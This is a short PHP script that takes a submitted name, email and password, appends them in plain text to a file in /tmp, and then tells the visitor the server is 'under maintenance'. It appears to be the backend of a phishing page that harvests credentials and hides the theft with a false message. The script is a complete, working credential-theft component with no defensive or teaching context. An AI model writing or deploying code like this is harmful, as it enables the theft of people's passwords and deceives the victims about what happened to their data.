<?php
if(isset($_POST['field1']) && isset($_POST['field2']) && isset($_POST['field3'])) {
    $data = 'Name=' . $_POST['field1'] . ' Email=' . $_POST['field2'] . ' Password=' . $_POST['field3']  . "\n";
    $ret = file_put_contents('/tmp/mydata.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "Server under maintenance";
    }
}
else {
   die('no post data to process');
}
